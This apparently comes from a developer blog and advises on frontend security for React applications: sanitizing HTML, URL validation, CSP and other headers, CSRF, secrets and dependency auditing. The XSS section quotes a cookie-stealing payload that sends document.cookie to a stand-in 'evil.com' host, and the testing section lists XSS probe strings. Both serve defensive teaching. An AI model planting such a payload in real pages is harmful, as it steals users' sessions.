---
title: "Frontend Security Best Practices Every Developer Should Know"
description: "XSS, CSRF, dependency vulnerabilities, and exposed secrets — the security mistakes I find in client React codebases and the practical fixes that actually work in production."
publishDate: 2026-03-05
updatedDate: 2026-06-10
category: "Security"
tags: ["Security", "React", "Frontend", "Best Practices"]
featured: true
accent: "#38BDF8"
image: "../../assets/blog/frontend-security-best-practices.jpg"
imageAlt: "Cybersecurity and code protection concept"
---

Security audits on frontend codebases follow a pattern. I open the repo, search for `dangerouslySetInnerHTML`, check where tokens are stored, scan `package.json` for known vulnerabilities, and within twenty minutes I've found issues the team has lived with for months. Not because they're bad developers — because frontend security education focuses on backend concerns and treats the browser as a safe sandbox.

It's not. The browser runs untrusted JavaScript from your dependencies, your ad scripts, and any XSS payload an attacker injects through a comment field you forgot to sanitize. Frontend security is real security, and the consequences — stolen sessions, defaced sites, regulatory fines, customer data exposure — land on the business, not just the backend team.

After fixing security issues across SaaS dashboards, e-commerce platforms, and marketing sites, I've compiled the practices that prevent the vulnerabilities I see repeatedly. This isn't a comprehensive OWASP textbook. It's what I implement and verify before handing off client projects.

## The Frontend Threat Model

Before applying security controls, understand what you're defending against in a React application:

| Threat | Attack vector | Impact |
|--------|--------------|--------|
| XSS | Unsanitized user input rendered as HTML | Session theft, keylogging, defacement |
| CSRF | Forged requests using victim's cookies | Unauthorized actions on authenticated accounts |
| Token exposure | JWT in localStorage, secrets in bundle | Account takeover |
| Supply chain | Compromised npm packages | Arbitrary code execution in users' browsers |
| Data leakage | Verbose error messages, exposed API keys | Information disclosure |
| Clickjacking | Invisible iframe overlay | Tricked user actions |

Your frontend cannot be the sole security layer. Authorization, input validation, and rate limiting must happen server-side. But frontend choices determine whether a single XSS vulnerability becomes a full breach or a harmless alert box.

## Cross-Site Scripting (XSS): The Most Common Frontend Vulnerability

XSS lets attackers inject JavaScript that runs in other users' browsers. In React apps, the primary risk vectors are:

**1. `dangerouslySetInnerHTML` with unsanitized content**

```tsx
// Dangerous — never do this with user content
<div dangerouslySetInnerHTML={{ __html: userBio }} />

// Safe — sanitize first
import DOMPurify from "dompurify";

<div
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(userBio, {
      ALLOWED_TAGS: ["b", "i", "em", "strong", "a", "p", "br"],
      ALLOWED_ATTR: ["href", "target", "rel"],
    }),
  }}
/>
```

I configure DOMPurify to force `rel="noopener noreferrer"` on links and strip `javascript:` URLs. Sanitize on the server at ingest time too — defense in depth means a bypass in one layer doesn't become a breach.

**2. URL injection in href and src attributes**

```tsx
// Dangerous — javascript: URLs execute code
<a href={userProvidedUrl}>Visit site</a>

// Safe — validate URL scheme
function sanitizeUrl(url: string): string {
  try {
    const parsed = new URL(url);
    if (!["http:", "https:", "mailto:"].includes(parsed.protocol)) {
      return "#";
    }
    return parsed.href;
  } catch {
    return "#";
  }
}

<a href={sanitizeUrl(userProvidedUrl)} rel="noopener noreferrer">
  Visit site
</a>
```

**3. Third-party rich text editors**

Clients love WYSIWYG editors for CMS content. These editors generate HTML that goes straight into your pages. Always sanitize editor output. Never trust the editor's "safe HTML" claims without verification.

**Real scenario:** A client's marketplace allowed vendors to write product descriptions with a rich text editor. One vendor (or attacker) embedded `<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">`. Because descriptions rendered unsanitized, any admin viewing the product page leaked their session cookie. Fix: DOMPurify on render plus server-side sanitization on save. Also: HttpOnly cookies, which would have blocked cookie theft even with the XSS.

React's JSX escaping protects against basic injection in text content — `{userInput}` is safe. The moment you bypass JSX with HTML rendering, URL attributes, or `eval`, you're responsible for sanitization.

## Content Security Policy (CSP)

CSP is a HTTP header that restricts which scripts, styles, and resources can load. It's the most effective defense-in-depth against XSS because even if an attacker injects a script tag, the browser refuses to execute it.

Basic CSP for a React SPA:

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' https://images.unsplash.com data:;
  connect-src 'self' https://api.yourapp.com;
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
```

In Next.js, configure via headers:

```ts
// next.config.ts
const securityHeaders = [
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-eval'", // remove unsafe-eval in production if possible
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "connect-src 'self' https://api.example.com",
      "frame-ancestors 'none'",
    ].join("; "),
  },
  {
    key: "X-Frame-Options",
    value: "DENY",
  },
  {
    key: "X-Content-Type-Options",
    value: "nosniff",
  },
  {
    key: "Referrer-Policy",
    value: "strict-origin-when-cross-origin",
  },
  {
    key: "Permissions-Policy",
    value: "camera=(), microphone=(), geolocation=()",
  },
];
```

CSP is notoriously painful with third-party scripts (analytics, chat widgets, Stripe). I start strict in development and loosen specific directives as needed, documenting each exception. `'unsafe-inline'` for scripts should be a last resort — use nonces instead.

## CSRF Protection for Cookie-Based Auth

If your app uses HttpOnly cookies for sessions, Cross-Site Request Forgery becomes relevant. An attacker's site can trigger authenticated requests because browsers send cookies automatically.

**Primary defense: SameSite cookies**

```ts
cookies().set("session", token, {
  httpOnly: true,
  secure: true,
  sameSite: "lax", // blocks cross-site POST; allows top-level navigation
  path: "/",
});
```

`SameSite=Lax` blocks most CSRF vectors. Use `SameSite=Strict` for higher security if your UX allows it (no cross-site links that need session).

**Additional defense: CSRF tokens for state-changing requests**

```tsx
// Server generates token, embeds in page
<meta name="csrf-token" content={csrfToken} />

// Client includes in requests
async function apiPost(url: string, body: unknown) {
  const csrfToken = document
    .querySelector('meta[name="csrf-token"]')
    ?.getAttribute("content");

  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "X-CSRF-Token": csrfToken ?? "",
    },
    credentials: "include",
    body: JSON.stringify(body),
  });
}
```

For JWT in Authorization headers (not cookies), CSRF is not a concern — browsers don't attach Authorization headers cross-origin automatically.

## Protecting Secrets and API Keys

The number one security finding in frontend audits: API keys committed to the repository or embedded in client bundles.

**Rules I enforce on every project:**

1. **Never put secret keys in frontend code** — not even in `.env.local` variables prefixed with `NEXT_PUBLIC_` unless they're designed to be public (Stripe publishable key, Google Maps client key with domain restrictions).
2. **Use server-side proxy routes** for third-party API calls that require secrets.
3. **Scan git history** before client handoff with tools like `gitleaks` or GitHub secret scanning.
4. **Rotate keys immediately** if exposure is suspected.

```ts
// Bad — secret key in client bundle
const stripe = new Stripe(process.env.NEXT_PUBLIC_STRIPE_SECRET!);

// Good — server route handles secret
// app/api/checkout/route.ts
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!); // no NEXT_PUBLIC prefix
```

```tsx
// Client only gets publishable key
const stripePromise = loadStripe(
  process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY!,
);
```

Environment variable naming conventions exist for a reason. I audit every `NEXT_PUBLIC_` and `VITE_` variable in the codebase and confirm each is safe to expose.

## Dependency and Supply Chain Security

Your `node_modules` folder is code that runs in production. A compromised package — or a typosquatted dependency — executes with full access to your users' sessions.

Practices I follow:

```bash
# Audit on every CI run
npm audit --audit-level=moderate

# Lock file integrity
npm ci  # never npm install in CI

# Check for known malicious packages
npx socket npm audit
```

**Package selection criteria:**

- Prefer packages with active maintenance, large user base, and security policy
- Pin major versions; review changelogs before updating
- Minimize dependency count — every package is attack surface
- Use `npm ls <package>` to understand why a dependency exists

For client projects, I add Dependabot or Renovate with auto-merge for patch updates only. Major version bumps get manual review.

**Real scenario:** A client's marketing site included a popular analytics wrapper that hadn't been updated in two years. npm audit flagged a transitive dependency with a prototype pollution vulnerability. The fix wasn't updating one package — it was replacing the abandoned wrapper with a direct integration. Supply chain security is ongoing maintenance, not a one-time audit.

## Secure Authentication Patterns on the Frontend

Covered in depth in my authentication article, but the security-critical summary:

```tsx
// Never
localStorage.setItem("token", jwt);
axios.defaults.headers.Authorization = `Bearer ${jwt}`;

// Always
fetch("/api/data", { credentials: "include" }); // HttpOnly cookie sent automatically
```

Additional frontend auth security:

- **Clear sensitive state on logout** — reset React state, clear IndexedDB, revoke refresh tokens server-side
- **Don't store PII in sessionStorage** for convenience
- **Implement idle timeout** — warn users after inactivity, log out after threshold
- **Validate redirect URLs** after login to prevent open redirect attacks

```ts
function safeRedirect(url: string | null, fallback = "/dashboard"): string {
  if (!url) return fallback;
  try {
    const parsed = new URL(url, window.location.origin);
    if (parsed.origin !== window.location.origin) return fallback;
    return parsed.pathname + parsed.search;
  } catch {
    return fallback;
  }
}
```

## Handling Sensitive Data in the Browser

Frontend developers sometimes store data they shouldn't:

| Data | Safe in browser? | Alternative |
|------|-----------------|-------------|
| Session token | No (use HttpOnly cookie) | Server-managed session |
| User preferences | Yes | localStorage |
| PII (SSN, health data) | No | Server-side only, fetch on demand |
| Payment card numbers | Never | Stripe Elements / tokenization |
| API secrets | Never | Server proxy |

For forms handling sensitive input, disable autocomplete where appropriate and never log form values to analytics or error tracking:

```tsx
<input
  type="password"
  autoComplete="current-password"
  data-1p-ignore // prevent password manager leaks in analytics DOM snapshots
/>
```

Configure Sentry and similar tools to scrub PII from breadcrumbs and session replays. I've seen session replay tools capture credit card fields because someone forgot to mask them.

## Security Headers and HTTPS

Every production site needs HTTPS without exception. Beyond TLS, security headers harden the browser environment:

```ts
// Complete header set I deploy
export const securityHeaders = [
  { key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains; preload" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" },
];
```

Test headers with [securityheaders.com](https://securityheaders.com) before launch. Clients appreciate a screenshot of an A rating in the handoff documentation — it's tangible proof of security investment.

Subresource Integrity (SRI) for CDN-loaded scripts:

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-..."
  crossorigin="anonymous"
></script>
```

If the CDN serves compromised content, SRI prevents execution.

## Input Validation: Client and Server

Client-side validation is UX. Server-side validation is security. Implement both, but never trust the client.

```tsx
// Client validation with Zod — for UX feedback
const loginSchema = z.object({
  email: z.string().email("Invalid email address"),
  password: z.string().min(8, "Password must be at least 8 characters"),
});

function LoginForm() {
  const handleSubmit = async (data: z.infer<typeof loginSchema>) => {
    const parsed = loginSchema.safeParse(data);
    if (!parsed.success) {
      setErrors(parsed.error.flatten().fieldErrors);
      return;
    }
    await login(parsed.data);
  };
}
```

The same schema runs on the server. Share Zod schemas between client and server in a monorepo for consistency. Attackers bypass client validation trivially with curl — server validation is the actual gate.

## Security Testing in Your Workflow

Security isn't a pre-launch checkbox. I integrate these into client project workflows:

1. **npm audit in CI** — fail builds on high/critical vulnerabilities
2. **ESLint security plugins** — `eslint-plugin-security`, `eslint-plugin-react-security`
3. **OWASP ZAP or Burp scan** on staging before launch
4. **Manual XSS testing** — inject `<script>alert(1)</script>` and `" onmouseover="alert(1)` into every input field
5. **Check browser DevTools Sources** — search bundled JS for accidental secret strings
6. **Review third-party script permissions** — what data does your chat widget access?

For a healthcare client, we added automated DAST scanning to their CI pipeline. First run found an open redirect on the login page that manual testing missed for three sprints. Automated security testing pays for itself on the first finding.

## Conclusion

Frontend security isn't optional decoration on a backend fortress. XSS, exposed secrets, and vulnerable dependencies in your React app directly compromise users. The fixes are well-known and mostly unglamorous: sanitize HTML, use HttpOnly cookies, configure CSP, audit dependencies, keep secrets server-side, validate input on the server.

When I consult on frontend projects, security review is part of every code audit — not a separate engagement. Clients hiring a freelance frontend developer should expect this baseline. Demonstrating security awareness is also how I differentiate from developers who ship features fast and leave vulnerabilities faster.

Build the habits now: sanitize, scan, header-harden, and never trust the browser to keep secrets.


Security is not a one-time hardening sprint — dependency audits and header drift need owners. That ongoing work fits [website maintenance services](/website-maintenance-services).

## Key Takeaways

- **React's JSX escaping is not enough** — sanitize any HTML rendering, URL attributes, and rich text editor output with DOMPurify.
- **Content Security Policy** is the strongest XSS mitigation; configure it even if imperfect initially.
- **HttpOnly cookies with SameSite=Lax** prevent both token theft and most CSRF attacks.
- **Never expose secret API keys** in client bundles — proxy sensitive calls through server routes.
- **Audit dependencies continuously** in CI; abandoned packages are latent vulnerabilities.
- **Client validation is UX; server validation is security** — share schemas but enforce server-side.
- **Security headers, HTTPS, and SRI** harden the browser environment with minimal ongoing cost.
